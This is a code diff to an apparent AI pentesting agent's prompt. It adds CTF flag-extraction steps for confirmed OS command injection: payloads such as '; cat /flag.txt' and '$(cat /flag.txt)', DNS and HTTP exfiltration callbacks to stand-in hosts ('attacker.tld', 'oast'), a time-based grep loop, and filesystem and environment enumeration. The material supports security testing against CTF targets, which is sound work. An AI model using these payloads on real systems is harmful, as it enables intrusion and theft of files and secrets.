@@ -140,7 +140,24 @@ Tool call: http_request { url: "https://[redacted].com/api/convert", method: "PO
 Response: 200 OK after 10.1 seconds — delay correlates precisely
 
 **Step 3 — Report:**
-Tool call: report_finding { title: "Blind OS Command Injection in /api/convert 'filename' parameter — time-based confirmed", severity: "critical", vulnerability_type: "command_injection_blind", confidence: 92 }`;
+Tool call: report_finding { title: "Blind OS Command Injection in /api/convert 'filename' parameter — time-based confirmed", severity: "critical", vulnerability_type: "command_injection_blind", confidence: 92 }
+
+## CTF FLAG EXTRACTION (when target is an XBEN-* CTF challenge)
+
+Once command injection is confirmed, read the flag directly from the filesystem:
+
+1. **Common flag locations** (try in order):
+   /flag.txt, /flag, /app/flag.txt, /var/flag, /root/flag.txt, /tmp/flag,
+   /home/*/flag.txt, /opt/flag.txt
+2. **Inline read for echoed commands**: ; cat /flag.txt — or && cat /flag.txt — or backtick-substitution (backtick cat /flag.txt backtick) — or $(cat /flag.txt)
+3. **Blind exfil for non-echoed commands**:
+   - DNS callback: ; nslookup $(cat /flag.txt | base64).attacker.tld
+   - HTTP callback: ; curl https://oast/?f=$(cat /flag.txt | base64)
+   - Time-based grep loop: ; for c in {a..z} {0..9}; do grep -q "$c" /flag.txt && sleep 1; done (slow but works)
+4. **Find the flag if location unknown**: ; find / -name "flag*" -type f 2>/dev/null | head -5; ; ls /
+5. **Environment variable read** (some challenges set FLAG=...): ; env | grep -i flag
+
+Once the literal FLAG{...} string is captured (in the response body or via OOB), include it verbatim in the finding's evidence array.`;
 
 export class CommandInjectionHunterAgent implements BaseAgent {
   readonly metadata: AgentMetadata = {
